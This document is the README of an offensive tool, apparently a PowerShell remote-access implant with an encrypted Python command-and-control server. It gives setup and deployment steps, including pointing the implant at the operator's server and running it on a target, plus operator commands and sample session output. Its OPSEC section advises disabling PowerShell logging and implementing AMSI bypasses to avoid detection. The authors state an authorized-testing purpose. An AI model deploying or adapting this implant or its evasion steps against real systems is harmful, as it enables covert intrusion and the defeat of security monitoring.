# Stage 0 PowerShell Implant

A lightweight, OPSEC-focused PowerShell implant with encrypted command and control communication.

## Features

- **Encrypted Communication**: AES-256-CBC encryption for all C2 traffic
- **Session Management**: Multi-session support with easy switching
- **PowerShell Integration**: Native PowerShell command execution
- **OPSEC-Safe**: In-memory execution, minimal process creation
- **Simple Interface**: Clean operator interface without complex prefixes

## Components

### Server (`server.py`)
- Python-based C2 server with encrypted communication
- Multi-session management
- Interactive operator interface
- Session logging to `stage0_logs/` directory

### Implant (`implant.ps1`)
- PowerShell-based implant
- AES-256-CBC encrypted communication
- In-memory command execution
- Automatic reconnection handling

## Setup

### Prerequisites
```bash
pip install pycryptodome prompt_toolkit
```

### Server Setup
```bash
python3 server.py <listen_ip> <port>
```

Example:
```bash
python3 server.py 0.0.0.0 4343
```

### Implant Deployment
1. Modify the server IP and port in `implant.ps1`:
   ```powershell
   param(
       [string]$server = "YOUR_SERVER_IP",
       [int]$port = 4343
   )
   ```

2. Deploy to target system and execute:
   ```powershell
   .\implant.ps1
   ```

## Usage

### Operator Commands

| Command | Description |
|---------|-------------|
| `help` | Show help message |
| `sessions` | List active sessions |
| `use <session_id>` | Switch to a specific session |
| `kill <session_id>` | Forcibly close a session |
| `exit` | Exit current session (sends EXIT to implant) |

### Remote Commands

| Command Type | Example | Description |
|--------------|---------|-------------|
| **PowerShell** | `Get-Process` | Execute PowerShell commands (default) |
| **PowerShell** | `ps` | Process listing (PowerShell alias) |
| **PowerShell** | `ls` | Directory listing (PowerShell alias) |
| **PowerShell** | `whoami` | Get current user |
| **Windows CMD** | `CMD whoami` | Execute Windows command prompt commands |

### Examples

```bash
[OPERATOR] >>> sessions
Active sessions:
  1: 192.168.1.100:12345 [active] <-- selected

[OPERATOR] >>> ps
Handles NPM(K)  PM(K)  WS(K)   CPU(s)    Id SI ProcessName
------- ------  -----  -----   ------    -- -- -----------
    325     20   7284  39620     1.61  2976  1 explorer
    150      8   1452   7312     0.00  2604  0 powershell

[OPERATOR] >>> ls
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        1/1/2024   9:00:00 AM                Documents
-a----        1/1/2024   9:30:00 AM           1234 file.txt

[OPERATOR] >>> whoami
DOMAIN\username

[OPERATOR] >>> CMD ipconfig
Windows IP Configuration
Ethernet adapter Ethernet:
   Connection-specific DNS Suffix  . : local
   IPv4 Address. . . . . . . . . . . : 192.168.1.100
```

## OPSEC Considerations

### Strengths
- **In-memory execution**: Most commands run in PowerShell memory space
- **No process creation**: Commands don't spawn new processes (except CMD)
- **Encrypted communication**: All traffic is AES-256-CBC encrypted
- **Session persistence**: Maintains connection across command execution

### Detection Vectors
- **PowerShell logging**: Commands may be logged by ScriptBlock logging
- **AMSI scanning**: Commands are scanned by Anti-Malware Scan Interface
- **Network traffic**: Encrypted but detectable as unusual traffic
- **Process behavior**: PowerShell process with network activity

### Mitigation Strategies
- **Disable PowerShell logging** in target environment
- **Use CMD prefix** for commands that need to avoid PowerShell logging
- **Implement AMSI bypasses** for sensitive operations
- **Use environment variables** instead of `whoami` for user info

## File Structure

```
stage0/
├── server.py          # C2 server
├── implant.ps1        # PowerShell implant
├── stage0_logs/       # Session logs
├── __pycache__/       # Python cache
└── README.md          # This file
```

## Security Notes

- **For educational/authorized testing only**
- **Use only on systems you own or have explicit permission to test**
- **Encryption keys are hardcoded - change for production use**
- **Consider implementing certificate-based authentication**
- **Monitor for detection and adjust OPSEC measures accordingly**

## Troubleshooting

### Common Issues

**Implant won't connect:**
- Check server IP/port configuration
- Verify firewall settings
- Ensure PowerShell execution policy allows script execution

**Commands not working:**
- Use `CMD` prefix for Windows commands
- PowerShell commands run by default
- Check session status with `sessions`

**Session disconnects:**
- Implant automatically handles reconnection
- Check network connectivity
- Verify server is still running

## License

This project is for educational and authorized security testing purposes only. Use responsibly and in accordance with applicable laws and regulations.
